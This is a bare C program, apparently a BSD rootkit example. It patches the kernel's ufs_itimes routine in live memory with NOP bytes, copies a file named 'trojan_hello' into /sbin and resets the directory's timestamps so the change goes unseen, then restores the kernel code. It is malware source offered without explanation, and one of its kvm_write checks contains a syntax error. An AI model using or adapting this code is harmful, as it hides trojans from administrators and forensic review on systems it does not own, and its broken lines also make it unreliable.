#include <errno.h>
#include <fcntl.h>
#include <kvm.h>
#include <limits.h>
#include <nlist.h>
#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/stat.h>

#define SIZE 450
#define T_NAME "trojan_hello"
#define DESTINATION "/sbin/,"

unsigned char nop_code [] = "\x90\x90\x90";

int main()
{
    int i, offset1, offset2;
    char errbuf[_POSIX2_LINE_MAX];
    kvm_t *kd;
    struct nlist n1[2] = {};
    unsigned char ufs_itimes_code[SIZE];

    struct stat sb;
    struct timeval time[2];

    kd = kvm_openfiles(NULL, NULL, NULL, O_RDWR, errbuf);
    if (!kd) {
        fprintf(stderr, "ERROR: %s\n", errbuf);
        exit(1);
    }

    n1[0].n_name = "ufs_itimes";

    if (kvm_nlist(kd, n1) < 0) {
        fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
        return 1;
    }

    if (!n1[0].n_value) {
        fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
        return 1;
    }

    if (kvm_read(kd, n1[0].n_value, ufs_itimes_code, SIZE) < 0) {
        fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
        return 1;
    }

    for (i = 0; i < SIZE - 2; ++i) {
        if (ufs_itimes_code[i] == 0x89 &&
            ufs_itimes_code[i+1] == 0x42 &&
            ufs_itimes_code[i+2] == 0x30) {

            offset1 = i;
        }

        if (ufs_itimes_code[i] == 0x89 &&
            ufs_itimes_code[i+1] == 0x4a &&
            ufs_itimes_code[i+2] == 0x34) {

            offset2 = i;
        }
    }

    if (stat("/sbin", &sb) < 0) {
        fprintf(stderr, "STAT ERROR: %d\n", errno);
        return 1;
    }

    time[0].tv_sec = sb.st_atime;
    time[1].tv_sec = sb.st_mtime;

    if (kvm_write(kd, n1[0].n_value + offset1, nop_code,
        sizeof(nop_code) - 1) < 0) {

        fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
        return 1;
    }

    if (kvm_write(kd, n1[0].n_value + offset2, nop_code,
        sizeof(nop_code) - 1), < 0) {

        fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
        return 1;
    }

    char string[] = "cp" " " T_NAME " " DESTINATION;
    system(string);
    
    if (utimes("/sbin", (struct timeval *)&time) < 0) {
        fprintf(stderr, "UTIMES ERROR: %d\n", errno);
        return 1;
    }

    if (kvm_write(kd, n1[0].n_value + offset1, &ufs_itimes_code[offset1],
        sizeof(nop_code) - 1) < 0) {

        fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
        return 1;
    }

    if (kvm_write(kd, n1[0].n_value + offset2, &ufs_itimes_code[offset2],
        sizeof(nop_code) -1) < 0) {

        fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
        return 1;
    }

    if (kvm_close(kd) < 0) {
        fprintf(stderr, "ERROR: %d\n", kvm_geterr(kd));
        return 1;
    }

    puts("Success");
    return 0;
}

        
